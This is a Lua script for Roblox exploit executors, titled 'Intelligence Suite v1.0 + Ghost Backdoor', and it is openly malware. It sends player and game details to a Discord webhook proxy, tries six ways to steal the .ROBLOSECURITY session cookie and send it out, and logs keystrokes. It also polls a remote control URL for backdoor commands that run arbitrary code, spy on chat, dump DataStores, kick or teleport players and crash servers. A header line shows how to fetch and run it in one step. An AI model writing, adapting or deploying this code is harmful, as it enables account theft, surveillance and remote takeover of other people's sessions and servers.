-- Intelligence Suite v1.0 + Ghost Backdoor
-- Run this in any executor via:
-- loadstring(game:HttpGet("https://raw.githubusercontent.com/bcakhub/ghost/main/suite.lua"))()

local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local PROXY = "https://roblox-discord-proxy.kevinaugusta27.workers.dev/webhook"
local CONTROL = "https://roblox-discord-proxy.kevinaugusta27.workers.dev/control"
local SETCMD = "https://roblox-discord-proxy.kevinaugusta27.workers.dev/setcmd"

getgenv().IntelSuite = {
    Buffer = "",
    IsActive = true
}

-- Universal HTTP POST
local function POST(url, body)
    local h = {["Content-Type"] = "application/json"}
    pcall(function()
        if request then
            request({Url=url, Method="POST", Headers=h, Body=body})
        elseif http_request then
            http_request({Url=url, Method="POST", Headers=h, Body=body})
        elseif syn and syn.request then
            syn.request({Url=url, Method="POST", Headers=h, Body=body})
        else
            HttpService:PostAsync(url, body, Enum.HttpContentType.ApplicationJson)
        end
    end)
end

-- Universal HTTP GET
local function GET(url)
    local out = nil
    pcall(function()
        if request then
            out = request({Url=url, Method="GET"}).Body
        elseif http_request then
            out = http_request({Url=url, Method="GET"}).Body
        elseif syn and syn.request then
            out = syn.request({Url=url, Method="GET"}).Body
        end
    end)
    return out
end

-- Build and send Discord embed
local function send(title, desc, color)
    local ok, encoded = pcall(function()
        return HttpService:JSONEncode({
            embeds = {{
                title = tostring(title),
                description = tostring(desc):sub(1, 1900),
                color = color or 65535,
                footer = {text = "Intelligence Suite v1.0"},
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        })
    end)
    if ok then POST(PROXY, encoded) end
end

-- Executor detection
local function getExec()
    if identifyexecutor then
        local ok, r = pcall(identifyexecutor)
        if ok and r then return tostring(r) end
    end
    if getexecutorname then
        local ok, r = pcall(getexecutorname)
        if ok and r then return tostring(r) end
    end
    if syn and syn.version then return "Synapse X" end
    if KRNL_LOADED then return "KRNL" end
    if listfiles then
        local ok, f = pcall(listfiles, "")
        if ok and f then
            for _, v in ipairs(f) do
                local l = tostring(v):lower()
                if l:find("xeno") then return "Xeno (fp)" end
                if l:find("krnl") then return "KRNL (fp)" end
                if l:find("synapse") then return "Synapse (fp)" end
                if l:find("scriptware") then return "Script-Ware (fp)" end
                if l:find("solara") then return "Solara (fp)" end
                if l:find("wave") then return "Wave (fp)" end
                if l:find("delta") then return "Delta (fp)" end
            end
        end
    end
    return "Unknown"
end

-- Game name helper
local function getGame()
    local name = "Unknown"
    pcall(function()
        name = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    end)
    return name
end

-- ============================================================
-- MODULE 1: Execution Alert
-- ============================================================
task.spawn(function()
    local exec = getExec()
    local game_name = getGame()
    send("SCRIPT EXECUTED",
        "**User:** " .. LocalPlayer.Name ..
        "\n**User ID:** " .. tostring(LocalPlayer.UserId) ..
        "\n**Display Name:** " .. LocalPlayer.DisplayName ..
        "\n**Account Age:** " .. tostring(LocalPlayer.AccountAge) .. " days" ..
        "\n**Executor:** " .. exec ..
        "\n**Game:** " .. game_name ..
        "\n**Place ID:** " .. tostring(game.PlaceId) ..
        "\n**Job ID:** " .. tostring(game.JobId) ..
        "\n\n**Modules:** Keylogger, Token Stealer, Scraper, Heartbeat, Kill Switch, Backdoor",
        65280
    )
end)

task.wait(1)

-- ============================================================
-- MODULE 2: Scraper
-- ============================================================
task.spawn(function()
    if not getgenv().IntelSuite.IsActive then return end
    send("SCRAPE DATA",
        "**User:** " .. LocalPlayer.Name ..
        "\n**User ID:** " .. tostring(LocalPlayer.UserId) ..
        "\n**Account Age:** " .. tostring(LocalPlayer.AccountAge) .. " days" ..
        "\n**Executor:** " .. getExec() ..
        "\n**Game:** " .. getGame() ..
        "\n**Place ID:** " .. tostring(game.PlaceId) ..
        "\n**Job ID:** " .. tostring(game.JobId) ..
        "\n**Time:** " .. tostring(os.time()),
        65535
    )
end)

task.wait(1)

-- ============================================================
-- MODULE 3: Token Stealer v6
-- ============================================================
task.spawn(function()
    local exec = getExec()
    local token = nil
    local log = {}

    send("TOKEN STEALER STARTED",
        "**User:** " .. LocalPlayer.Name ..
        "\n**Executor:** " .. exec ..
        "\n**Status:** Running all 6 methods...",
        16776960
    )

    task.wait(0.5)

    -- M1: syn.get_cookie
    pcall(function()
        if syn and syn.get_cookie then
            local ok, r = pcall(syn.get_cookie, ".ROBLOSECURITY")
            if ok and r and r ~= "" then token = r table.insert(log, "M1: SUCCESS") end
        else table.insert(log, "M1: SKIPPED") end
    end)
    if token then
        send("ROBLOSECURITY TOKEN", "**User:** " .. LocalPlayer.Name .. "\n**Method:** M1 syn.get_cookie\n**Token:**\n```" .. token:sub(1,900) .. "```", 16711680)
        return
    end
    task.wait(0.3)

    -- M2: get_cookie
    pcall(function()
        if get_cookie then
            local ok, r = pcall(get_cookie, ".ROBLOSECURITY")
            if ok and r and r ~= "" then token = r table.insert(log, "M2: SUCCESS") end
        else table.insert(log, "M2: SKIPPED") end
    end)
    if token then
        send("ROBLOSECURITY TOKEN", "**User:** " .. LocalPlayer.Name .. "\n**Method:** M2 get_cookie\n**Token:**\n```" .. token:sub(1,900) .. "```", 16711680)
        return
    end
    task.wait(0.3)

    -- M3: getrbxcookie
    pcall(function()
        if getrbxcookie then
            local ok, r = pcall(getrbxcookie)
            if ok and r and r ~= "" then token = r table.insert(log, "M3: SUCCESS") end
        else table.insert(log, "M3: SKIPPED") end
    end)
    if token then
        send("ROBLOSECURITY TOKEN", "**User:** " .. LocalPlayer.Name .. "\n**Method:** M3 getrbxcookie\n**Token:**\n```" .. token:sub(1,900) .. "```", 16711680)
        return
    end
    task.wait(0.3)

    -- M4: getcookies table
    pcall(function()
        if getcookies then
            local ok, r = pcall(function() local c = getcookies() return c and c[".ROBLOSECURITY"] end)
            if ok and r and r ~= "" then token = r table.insert(log, "M4: SUCCESS") end
        else table.insert(log, "M4: SKIPPED") end
    end)
    if token then
        send("ROBLOSECURITY TOKEN", "**User:** " .. LocalPlayer.Name .. "\n**Method:** M4 getcookies\n**Token:**\n```" .. token:sub(1,900) .. "```", 16711680)
        return
    end
    task.wait(0.3)

    -- M5: depth-2 file scan
    pcall(function()
        if listfiles and readfile then
            local scanned = 0
            local function scan(path)
                if scanned >= 200 or token then return end
                local ok, files = pcall(listfiles, path)
                if not ok or not files then return end
                for _, f in ipairs(files) do
                    if scanned >= 200 or token then return end
                    scanned = scanned + 1
                    local rok, content = pcall(readfile, f)
                    if rok and type(content) == "string" then
                        local found = content:match("%.ROBLOSECURITY=([^;%s\"'\n\r]+)")
                        if found and #found > 20 then token = found end
                    end
                end
            end
            scan("")
            if not token then
                local ok, root = pcall(listfiles, "")
                if ok and root then
                    for _, item in ipairs(root) do
                        if token then break end
                        pcall(function() scan(item) end)
                    end
                end
            end
            table.insert(log, "M5: scanned " .. tostring(scanned) .. " files")
            if token then
                send("ROBLOSECURITY TOKEN", "**User:** " .. LocalPlayer.Name .. "\n**Method:** M5 file scan\n**Token:**\n```" .. token:sub(1,900) .. "```", 16711680)
            end
        else table.insert(log, "M5: SKIPPED") end
    end)
    if token then return end
    task.wait(0.3)

    -- M6: Set-Cookie header
    pcall(function()
        if request then
            local ok, r = pcall(function() return request({Url="https://www.roblox.com/", Method="GET"}) end)
            if ok and r and r.Headers then
                local sc = r.Headers["set-cookie"] or r.Headers["Set-Cookie"] or ""
                local found = sc:match("%.ROBLOSECURITY=([^;]+)")
                if found and found ~= "" then
                    token = found
                    table.insert(log, "M6: SUCCESS")
                    send("ROBLOSECURITY TOKEN", "**User:** " .. LocalPlayer.Name .. "\n**Method:** M6 Set-Cookie\n**Token:**\n```" .. token:sub(1,900) .. "```", 16711680)
                else table.insert(log, "M6: FAILED") end
            else table.insert(log, "M6: FAILED") end
        else table.insert(log, "M6: SKIPPED") end
    end)

    if not token then
        send("TOKEN STEALER FAILED",
            "**User:** " .. LocalPlayer.Name ..
            "\n**Executor:** " .. exec ..
            "\n**Log:**\n```" .. table.concat(log, "\n"):sub(1,1000) .. "```",
            16711680
        )
    end
end)

task.wait(2)

-- ============================================================
-- MODULE 4: Keylogger
-- ============================================================
UserInputService.InputBegan:Connect(function(input, gp)
    if not getgenv().IntelSuite.IsActive then return end
    pcall(function()
        if input.KeyCode and input.KeyCode ~= Enum.KeyCode.Unknown then
            getgenv().IntelSuite.Buffer = getgenv().IntelSuite.Buffer .. "[" .. input.KeyCode.Name .. "]"
        end
        if #getgenv().IntelSuite.Buffer >= 50 then
            send("KEYLOG", "**User:** " .. LocalPlayer.Name .. "\n**Keys:** " .. getgenv().IntelSuite.Buffer, 16711680)
            getgenv().IntelSuite.Buffer = ""
        end
    end)
end)

-- ============================================================
-- MODULE 5: Kill Switch + Backdoor Command Poller (every 10s)
-- ============================================================
task.spawn(function()
    while true do
        task.wait(10)
        pcall(function()
            local response = GET(CONTROL)
            if not response or response == "" then return end
            local ok, data = pcall(function() return HttpService:JSONDecode(response) end)
            if not ok or not data then return end

            -- Kill switch
            if data.active ~= nil then
                local wasActive = getgenv().IntelSuite.IsActive
                getgenv().IntelSuite.IsActive = data.active
                if wasActive and not data.active then
                    getgenv().IntelSuite.Buffer = ""
                    send("SUITE STOPPED", "**User:** " .. LocalPlayer.Name .. "\n**Status:** Killed remotely.", 16711680)
                elseif not wasActive and data.active then
                    send("SUITE RESUMED", "**User:** " .. LocalPlayer.Name .. "\n**Status:** Resumed remotely.", 65280)
                end
            end

            -- Backdoor command
            if data.command and data.command ~= "" then
                local cmd = data.command:match("^%s*(.-)%s*$")

                if cmd == "ping" then
                    send("PONG", "**User:** " .. LocalPlayer.Name .. "\n**Game:** " .. getGame() .. "\n**Place:** " .. tostring(game.PlaceId) .. "\n**Players:** " .. tostring(#Players:GetPlayers()), 65280)

                elseif cmd == "players" then
                    local list = ""
                    for _, p in ipairs(Players:GetPlayers()) do
                        list = list .. "\n- **" .. p.Name .. "** (ID: " .. tostring(p.UserId) .. ", Age: " .. tostring(p.AccountAge) .. "d)"
                    end
                    send("PLAYER LIST", "**Game:** " .. getGame() .. "\n**Players:**" .. list, 65535)

                elseif cmd:sub(1,5) == "exec:" then
                    local code = cmd:sub(6)
                    local fn, err = loadstring(code)
                    if fn then
                        local ok2, res = pcall(fn)
                        if ok2 then
                            send("EXEC RESULT", "**Code:** ```lua\n" .. code:sub(1,400) .. "```\n**Result:** " .. tostring(res), 65280)
                        else
                            send("EXEC ERROR", "**Code:** ```lua\n" .. code:sub(1,400) .. "```\n**Error:** " .. tostring(res), 16711680)
                        end
                    else
                        send("EXEC PARSE ERROR", "**Error:** " .. tostring(err), 16711680)
                    end

                elseif cmd:sub(1,5) == "kick:" then
                    local name, reason = cmd:sub(6):match("^(.-)%s*|%s*(.*)$")
                    name = name or cmd:sub(6)
                    for _, p in ipairs(Players:GetPlayers()) do
                        if p.Name:lower() == name:lower() then
                            p:Kick(reason or "Kicked.")
                            send("KICKED", "**Player:** " .. p.Name, 16711680)
                        end
                    end

                elseif cmd == "chatspy" then
                    for _, p in ipairs(Players:GetPlayers()) do
                        p.Chatted:Connect(function(msg)
                            pcall(function() send("CHAT SPY", "**" .. p.Name .. ":** " .. msg, 8388736) end)
                        end)
                    end
                    Players.PlayerAdded:Connect(function(p)
                        p.Chatted:Connect(function(msg)
                            pcall(function() send("CHAT SPY", "**" .. p.Name .. ":** " .. msg, 8388736) end)
                        end)
                    end)
                    send("CHAT SPY", "Now spying on all chat.", 65280)

                elseif cmd == "dump" or cmd:sub(1,5) == "dump:" then
                    local storeName = cmd == "dump" and "PlayerData" or cmd:sub(6)
                    local DS = game:GetService("DataStoreService")
                    local results = ""
                    local store = nil
                    pcall(function() store = DS:GetDataStore(storeName) end)
                    if store then
                        for _, p in ipairs(Players:GetPlayers()) do
                            pcall(function()
                                local d = store:GetAsync(tostring(p.UserId))
                                results = results .. "\n**" .. p.Name .. ":** " .. tostring(HttpService:JSONEncode(d)):sub(1,300)
                            end)
                        end
                        send("DATASTORE DUMP", "**Store:** " .. storeName .. "\n" .. results, 16776960)
                    else
                        send("DUMP FAILED", "Could not open: " .. storeName, 16711680)
                    end

                elseif cmd == "crash" then
                    send("CRASH", "Crashing server now...", 16711680)
                    task.wait(1)
                    while true do Instance.new("Part").Parent = workspace end

                elseif cmd:sub(1,9) == "teleport:" then
                    local name, placeId = cmd:sub(10):match("^(.-)%s*|%s*(.*)$")
                    if name and placeId then
                        for _, p in ipairs(Players:GetPlayers()) do
                            if p.Name:lower() == name:lower() then
                                pcall(function()
                                    game:GetService("TeleportService"):Teleport(tonumber(placeId), p)
                                    send("TELEPORT", "**Player:** " .. p.Name .. "\n**Place:** " .. placeId, 65280)
                                end)
                            end
                        end
                    end

                elseif cmd == "stop" then
                    getgenv().IntelSuite.IsActive = false
                    send("STOPPED", "Suite deactivated.", 16711680)

                elseif cmd == "start" then
                    getgenv().IntelSuite.IsActive = true
                    send("STARTED", "Suite reactivated.", 65280)
                end
            end
        end)
    end
end)

-- ============================================================
-- MODULE 6: Heartbeat (every 60s)
-- ============================================================
task.spawn(function()
    while true do
        task.wait(60)
        if not getgenv().IntelSuite.IsActive then continue end
        pcall(function()
            local desc = "**User:** " .. LocalPlayer.Name .. "\n**Status:** ACTIVE\n**Game:** " .. getGame()
            if #getgenv().IntelSuite.Buffer > 0 then
                desc = desc .. "\n**Keys Flushed:** " .. getgenv().IntelSuite.Buffer
                getgenv().IntelSuite.Buffer = ""
            end
            send("HEARTBEAT", desc, 65535)
        end)
    end
end)
